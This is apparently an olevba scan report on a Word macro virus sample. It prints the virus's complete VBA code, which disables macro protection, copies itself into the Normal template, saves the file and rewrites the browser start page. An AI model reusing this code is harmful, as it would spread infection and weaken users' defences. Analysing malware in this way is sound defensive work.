olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Hope.f-69089c2da1ead22c8492e160630d70fc9eb181e2
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Hope.f-69089c2da1ead22c8492e160630d70fc9eb181e2 - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Private Sub Document_Open()
Options.VirusProtection = 0: Options.SaveNormalPrompt = 0: Options.ConfirmConversions = 0
If ThisDocument = NormalTemplate Then Set TI = ActiveDocument Else Set TI = NormalTemplate
VM = ThisDocument.VBProject.VBComponents.Item(1).CodeModule.Lines(1, ThisDocument.VBProject.VBComponents.Item(1).CodeModule.CountOfLines)
Set IR = TI.VBProject.VBComponents.Item(1).CodeModule
IR.DeleteLines 1, IR.CountOfLines: IR.AddFromString VM
If TI = ActiveDocument Then ActiveDocument.SaveAs FileName:=ActiveDocument.FullName
System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Internet Explorer\Main", "Start Page") = "http://altern.org/lyskovick"
End Sub 'Schцnheiten Von Lys Kovick... Fьr Mein Engel!
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Document_Open       |Runs when the Word or Publisher document is  |
|          |                    |opened                                       |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|AddFromString       |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|System              |May run an executable file or a system       |
|          |                    |command on a Mac (if combined with           |
|          |                    |libc.dylib)                                  |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|IOC       |http://altern.org/ly|URL                                          |
|          |skovick             |                                             |
+----------+--------------------+---------------------------------------------+

